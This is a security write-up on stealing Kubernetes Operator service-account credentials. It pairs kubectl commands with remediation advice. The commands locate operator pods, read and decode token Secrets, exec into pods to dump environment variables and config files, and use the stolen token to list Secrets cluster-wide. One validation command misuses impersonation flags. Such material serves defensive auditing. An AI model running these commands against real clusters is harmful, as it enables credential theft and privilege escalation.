# Kubernetes Operator Credential Extraction Vulnerability

## 1. Overview

This document details the vulnerability of extracting credentials from a Kubernetes Operator. Operators, designed to manage complex stateful applications within Kubernetes, often require privileged access to resources, making their credentials a high-value target for attackers.

### Attack Vector Description

An attacker gaining access to the Kubernetes cluster, either through exposed APIs, compromised nodes, or misconfigured RBAC, can potentially extract the credentials used by the Operator. This is often accomplished by examining the Operator's configuration, environment variables, secrets, or the Operator's code itself.

### Potential Impact and Consequences

Successful credential extraction allows the attacker to:

*   **Privilege Escalation:** Use the Operator's privileges to access sensitive resources within the cluster.
*   **Lateral Movement:** Access other workloads and services managed by the Operator.
*   **Data Exfiltration:** Steal sensitive data managed by the applications handled by the Operator.
*   **Denial of Service:** Disrupt or disable the applications managed by the Operator.
*   **Cluster Compromise:** In some cases, the Operator might have sufficient permissions to compromise the entire Kubernetes cluster.

### Risk Level Assessment

**Critical/High**. The risk level is highly dependent on the privileges granted to the Operator. If the Operator has wide-ranging access, the risk is Critical. If the access is limited to a specific namespace, the risk is High.

### Technical Explanation

This vulnerability exists because Operators are often deployed with service accounts that have significant permissions. These permissions are necessary for the Operator to manage the applications under its control. The credentials associated with these service accounts are stored as Kubernetes Secrets. An attacker can exploit vulnerabilities in the cluster's security to gain access to these Secrets. Another contributing factor is insufficient security practices during the Operator's development or deployment, leading to credentials being hardcoded in configuration files or environment variables, or stored in unencrypted volumes.

### Prerequisites and Conditions Needed

*   **Access to the Kubernetes cluster:** This could be achieved through compromised worker nodes, exposed APIs, or misconfigured RBAC.
*   **Identification of the target Operator:** Knowing the Operator's name and namespace is crucial.
*   **Sufficient RBAC permissions to view Secrets (ideally) or other resources:** At a minimum, the attacker needs permissions to access resources that might contain or lead to the discovery of the Operator's credentials.  Alternatively, an exploited pod vulnerability can provide access even without Kubernetes RBAC.

## 2. Validation and Exploitation Steps

This section outlines the steps to validate and exploit the Operator credential extraction vulnerability.

**Phase 1: Information Gathering and Reconnaissance**

1.  **List all Pods to identify potential Operators:**

    ```bash
    kubectl get pods --all-namespaces
    ```

    **Explanation:** This command lists all pods in all namespaces.  We are looking for pods that are named or described as Kubernetes Operators.
    **Expected Output:** A list of pods with their names, namespaces, and status.  Identify pods with names like `<operator-name>-operator`, `operator-manager`, etc.
    **Why:**  To find the Operators running in the cluster.

2.  **Describe the Operator pod to find its Service Account:**

    ```bash
    kubectl describe pod <operator-pod-name> -n <operator-namespace>
    ```

    **Explanation:** This command describes a specific pod, providing detailed information about its configuration. We are looking for the `Service Account` field, which tells us which service account the pod is using.
    **Expected Output:** A detailed description of the pod, including the `Service Account` field.
    **Why:**  To determine the Service Account used by the Operator.

3.  **Identify the Service Account Token Secret:**

    ```bash
    kubectl describe serviceaccount <service-account-name> -n <operator-namespace>
    ```

    **Explanation:** This command describes the Service Account, revealing the Secret associated with it that contains the token.
    **Expected Output:**  A description of the Service Account, including the `Secrets` field, which will list the name of the Secret containing the service account token.  Look for a secret ending in `-token-<random-string>`.
    **Why:** To find the name of the Kubernetes Secret containing the Service Account's token.

**Phase 2: Credential Extraction**

4.  **Extract the Service Account Token:**

    ```bash
    kubectl get secret <service-account-token-secret-name> -n <operator-namespace> -o yaml
    ```

    **Explanation:** This command retrieves the contents of the Secret in YAML format.
    **Expected Output:** YAML representation of the Secret.  The `data` section will contain the `token` key, which is base64 encoded.
    **Why:** To retrieve the base64 encoded token.

5.  **Decode the Service Account Token:**

    ```bash
    kubectl get secret <service-account-token-secret-name> -n <operator-namespace> -o jsonpath='{.data.token}' | base64 -d
    ```

    **Explanation:** This command uses `kubectl` with `jsonpath` to extract the `token` value from the Secret's `data` section, then uses `base64 -d` to decode it.
    **Expected Output:** The decoded Service Account token.  This is the credential you are looking for.
    **Why:** To decode the base64 encoded token, revealing the Service Account token.

**Phase 3: Validation (Using the extracted credentials)**

6.  **Use the token to authenticate against the Kubernetes API:**

    ```bash
    TOKEN="<extracted-token>"
    kubectl auth can-i get pods --as system:serviceaccount:<operator-namespace>:<service-account-name> --token=$TOKEN
    ```

    **Explanation:** This command uses the `kubectl auth can-i` command to check if the extracted token allows the user (represented by the service account) to get pods.  This verifies that the token is valid and has some level of authorization.
    **Expected Output:**  "yes" if the token is valid and authorized to get pods.  "no" if the token is invalid or not authorized.
    **Why:** To validate the extracted token by testing it against the Kubernetes API to see what actions it is allowed to perform.  This demonstrates the level of compromise.

7.  **Attempt to list Secrets in the cluster:**

    ```bash
    TOKEN="<extracted-token>"
    kubectl --token=$TOKEN get secrets --all-namespaces
    ```

    **Explanation:** This command tries to list all secrets in all namespaces using the extracted token for authentication. This helps determine the actual privileges associated with the service account.
    **Expected Output:** If the token has sufficient permissions, a list of all Secrets will be displayed. If not, an error message indicating lack of authorization will be shown.
    **Why:** To verify the extent of access that the compromised credentials provide, attempting actions the operator might need to perform to manage its applications.

**Alternative Approaches:**

*   **Examining Environment Variables:**  Operators might accidentally store credentials in environment variables.
    ```bash
    kubectl exec -it <operator-pod-name> -n <operator-namespace> -- env
    ```
    This command executes `env` inside the Operator's pod, listing all environment variables. Look for variables containing credentials, API keys, or secrets.

*   **Inspecting Operator Configuration Files:**  Some Operators rely on configuration files.  Examine these files for potential credential leaks. This requires knowing the location of the configuration file within the container. For example:

    ```bash
    kubectl exec -it <operator-pod-name> -n <operator-namespace> -- cat /path/to/config/file.yaml
    ```

*   **Reviewing Operator Logs:** Sometimes, credentials are inadvertently logged during Operator initialization or operation. Analyzing Operator logs can reveal exposed secrets.

    ```bash
    kubectl logs <operator-pod-name> -n <operator-namespace>
    ```

**Remediation Recommendations:**

*   **Least Privilege:**  Grant Operators only the minimum necessary permissions to perform their tasks. Use RBAC effectively to restrict access to specific resources and namespaces.
*   **Credential Rotation:** Regularly rotate the credentials used by Operators to limit the impact of compromised credentials.
*   **Secure Secret Management:**  Store credentials securely using Kubernetes Secrets and consider using a Secret management solution like HashiCorp Vault.
*   **Code Review:**  Conduct thorough code reviews of Operator code to identify and eliminate potential credential leaks, such as hardcoded passwords or insecure storage practices.
*   **Regular Security Audits:**  Perform regular security audits of Kubernetes deployments to identify and address potential vulnerabilities.
*   **Principle of Least Authority for Service Accounts:**  Ensure that Service Accounts do not have more privileges than absolutely necessary.
*   **Implement Pod Security Policies/Pod Security Standards:**  Utilize Pod Security Policies or Pod Security Standards to restrict the capabilities of pods, including access to the host network and filesystem.
*   **Runtime Security Monitoring:** Implement runtime security monitoring to detect and respond to suspicious activity within the cluster, such as unauthorized access to Secrets or API calls.
